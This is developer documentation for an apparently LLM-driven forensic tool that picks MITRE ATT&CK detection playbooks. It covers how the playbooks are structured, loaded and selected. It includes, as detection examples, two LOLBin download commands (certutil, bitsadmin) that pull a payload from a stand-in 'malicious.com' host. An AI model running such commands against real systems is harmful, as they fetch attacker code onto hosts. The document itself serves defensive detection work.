# Investigation Playbooks

Investigation playbooks provide strategic guidance for analyzing specific attack scenarios. The system uses LLM-based selection to automatically choose the most relevant playbook based on the user's investigation question.

## Architecture

### Dynamic Loading

Playbooks are loaded dynamically from `api/worker/agents/playbooks/` directory:

- **Auto-discovery**: All `.yaml` files are loaded on worker startup
- **Hot-reload support**: Call `get_playbook_registry(reload=True)` to reload from disk
- **No hardcoding**: Add/modify/delete playbooks by editing YAML files
- **UI integration ready**: Designed for future UI-based playbook management

### Selection Process

1. User asks investigation question
2. System presents all playbook descriptions to LLM
3. LLM selects most relevant playbook (or "none")
4. Selected playbook content injected into agent's investigation strategy
5. Agent follows playbook guidance during investigation

## Playbook Categories

### MITRE ATT&CK Tactics (14 playbooks)

Aligned with the MITRE ATT&CK framework:

- `initial_access.yaml` - Phishing, brute force, web exploits
- `execution.yaml` (as `malware_execution.yaml`) - Process creation, suspicious execution
- `persistence.yaml` - Registry keys, scheduled tasks, services
- `privilege_escalation.yaml` - Token manipulation, UAC bypass
- `defense_evasion.yaml` - Log clearing, obfuscation, process injection
- `credential_access.yaml` - LSASS dumping, Mimikatz, Kerberos attacks
- `discovery.yaml` - Reconnaissance, enumeration commands
- `lateral_movement.yaml` - Network logons, PsExec, admin shares
- `collection.yaml` - File archiving, data staging
- `command_and_control.yaml` - Beaconing, DNS tunneling, C2 channels
- `exfiltration.yaml` (as `data_exfiltration.yaml`) - Large transfers, cloud uploads
- `impact.yaml` - Ransomware, data destruction, service disruption
- `resource_development.yaml` - Tool downloads, compilation

### Attack Techniques (7 playbooks)

Focused on specific attack methods:

- `living_off_the_land.yaml` - LOLBin abuse (certutil, bitsadmin, mshta, etc.)
- `fileless_attacks.yaml` - In-memory execution, WMI persistence, process injection
- `golden_silver_tickets.yaml` - Forged Kerberos tickets for persistence
- `dcsync_attack.yaml` - Domain credential replication abuse
- `web_shells.yaml` - Malicious scripts on web servers
- `kerberoasting.yaml` - Service ticket cracking for passwords
- `pass_the_hash.yaml` - NTLM hash authentication without passwords

## Playbook Structure

Each playbook is a YAML file with three required fields:

```yaml
name: playbook_name
description: Brief description shown to LLM for selection

playbook: |
  ## PLAYBOOK TITLE
  
  ### What is [Attack/Technique]?
  Brief explanation of the attack or technique.
  
  ### Key Indicators to Investigate:
  
  1. **Indicator Name (Event IDs)**
     - Description of what to look for
     - Fields: EventData fields to query
     - Query: Specific query examples
     - Red flags: What makes this suspicious
  
  2. **Another Indicator**
     ...
  
  ### Investigation Strategy:
  
  **Phase 1 - Initial Detection**
  - Steps to identify the attack
  
  **Phase 2 - Analysis**
  - Steps to understand scope and impact
  
  **Phase 3 - Correlation**
  - Steps to connect evidence
  
  **Phase 4 - Assessment**
  - Steps to determine remediation needs
  
  ### Common Patterns:
  
  - Pattern descriptions with examples
  
  ### Detection Queries:
  
  ```
  # Example query patterns
  search_events_by_content(value='...', description='...')
  query_jsonb_field(jsonb_path='...', operator='...', value='...')
  ```
  
  ### Key Questions to Answer:
  
  1. Question about detection
  2. Question about scope
  3. Question about impact
  ...
```

## Adding New Playbooks

### Step 1: Create YAML File

Create a new `.yaml` file in `api/worker/agents/playbooks/`:

```yaml
name: my_technique
description: Investigation strategies for detecting [technique] - brief explanation of what it detects

playbook: |
  ## MY TECHNIQUE INVESTIGATION PLAYBOOK
  
  ### What is [Technique]?
  Explanation...
  
  ### Key Indicators to Investigate:
  
  1. **Primary Indicator (Event ID XXXX)**
     - What to look for
     - Fields: EventData.FieldName
     - Query: `search_events_by_content` for 'pattern'
     - Red flags: Suspicious characteristics
  
  ...
```

### Step 2: Reload Playbooks

**In production**: Restart worker container
```bash
docker compose restart worker
```

**In development**: Call reload function
```python
from worker.agents.playbooks import get_playbook_registry
registry = get_playbook_registry(reload=True)
```

### Step 3: Test Selection

Ask a question that should match your playbook:
```
"Investigate [technique] activity"
"Find evidence of [technique]"
```

The LLM will see your playbook description and select it if relevant.

## Writing Effective Playbooks

### Description Field

The description is critical for LLM selection. Make it:

**Specific**: Include key terms the LLM should match
```yaml
# Good
description: Investigation strategies for detecting Kerberoasting attacks - requesting service tickets to crack service account passwords offline

# Bad
description: Kerberos stuff
```

**Actionable**: Focus on what the playbook helps investigate
```yaml
# Good
description: Investigation strategies for detecting web shells - malicious scripts uploaded to web servers for remote access

# Bad
description: Web server security issues
```

### Playbook Content

Make playbooks:

**Specific**: Include exact event IDs, field names, query examples
```markdown
### Event ID 4769 - Service Ticket Requests
- Fields: EventData.ServiceName, EventData.TicketEncryptionType
- Query: `query_jsonb_field` with jsonb_path='EventData.TicketEncryptionType', value='0x17'
```

**Actionable**: Tell the agent what to do
```markdown
### Investigation Strategy:

**Phase 1 - Detect Activity**
- Query Event 4769 for bulk service ticket requests
- Aggregate by TargetUserName to find users requesting many tickets
```

**Example-rich**: Show concrete patterns
```markdown
### Common Commands:
- `certutil.exe -urlcache -f http://malicious.com/payload.exe`
- `bitsadmin.exe /transfer job http://malicious.com/file.exe`
```

## Future: UI-Based Playbook Management

The architecture supports future UI features:

### Planned Features

- **View Playbooks**: Browse all available playbooks in UI
- **Edit Playbooks**: Modify playbook content via web interface
- **Create Playbooks**: Add new playbooks without touching files
- **Delete Playbooks**: Remove playbooks from UI
- **Import/Export**: Share playbooks between systems
- **Version Control**: Track playbook changes over time

### Implementation Notes

When implementing UI management:

1. **Storage**: Keep YAML files as source of truth
2. **Validation**: Validate YAML structure before saving
3. **Reload**: Call `get_playbook_registry(reload=True)` after changes
4. **Permissions**: Restrict playbook editing to admin users
5. **Backup**: Keep backups of modified playbooks
6. **Audit**: Log who modified which playbooks

### API Endpoints (Future)

```python
# List all playbooks
GET /api/v1/playbooks

# Get specific playbook
GET /api/v1/playbooks/{name}

# Create playbook
POST /api/v1/playbooks
{
  "name": "my_playbook",
  "description": "...",
  "playbook": "..."
}

# Update playbook
PUT /api/v1/playbooks/{name}
{
  "description": "...",
  "playbook": "..."
}

# Delete playbook
DELETE /api/v1/playbooks/{name}

# Reload playbooks from disk
POST /api/v1/playbooks/reload
```

## Debugging

### Check Loaded Playbooks

```python
from worker.agents.playbooks import get_playbook_registry

registry = get_playbook_registry()
for pb in registry.playbooks:
    print(f"{pb.name}: {pb.description}")
```

### Test LLM Selection

```python
from worker.agents.playbooks import select_playbook_for_query
from worker.core import LLMClient

llm = LLMClient(endpoint="...", model="...", api_key="...")
playbook = await select_playbook_for_query(
    "Find evidence of lateral movement",
    llm
)
print(f"Selected: {playbook.name if playbook else 'none'}")
```

### View Selection Prompt

The LLM sees:

```
You are helping select the most relevant forensic investigation playbook.

User's Investigation Question:
Find evidence of lateral movement

Available Investigation Playbooks:

1. **lateral_movement**: Investigation strategies for detecting lateral movement - attackers moving from one system to another
2. **credential_access**: Investigation strategies for detecting credential access - credential dumping, password attacks
...

Respond with ONLY the playbook name (e.g., "lateral_movement") if one is relevant, or "none" if no playbook matches.
```

## Best Practices

### Playbook Naming

- Use lowercase with underscores: `my_technique.yaml`
- Be descriptive: `kerberoasting.yaml` not `kerb.yaml`
- Match technique names: `pass_the_hash.yaml` not `pth.yaml`

### Content Organization

1. **What is it?** - Brief explanation
2. **Key Indicators** - 10+ specific things to look for
3. **Investigation Strategy** - Phased approach
4. **Common Patterns** - Real-world examples
5. **Detection Queries** - Concrete query examples
6. **Key Questions** - What to answer

### Avoiding Overlap

If two playbooks cover similar ground:

- **Merge**: Combine into comprehensive playbook
- **Specialize**: Make each focus on different sub-scenarios
- **Trust LLM**: Let LLM select best match based on question

### Maintenance

- **Review regularly**: Update with new TTPs
- **Test selection**: Ensure LLM selects correctly
- **Update queries**: Match current event schema
- **Add examples**: Include real-world attack patterns

## Current Playbook Inventory

**Total**: 21 playbooks (14 tactics + 7 techniques)

**MITRE ATT&CK Coverage**: Complete (all 14 tactics)

**Attack Techniques**: 7 focused playbooks for common attack methods

**Next Steps**: Add more technique-specific playbooks as needed based on investigation patterns

---

For questions or suggestions, see the main [documentation index](index.md).
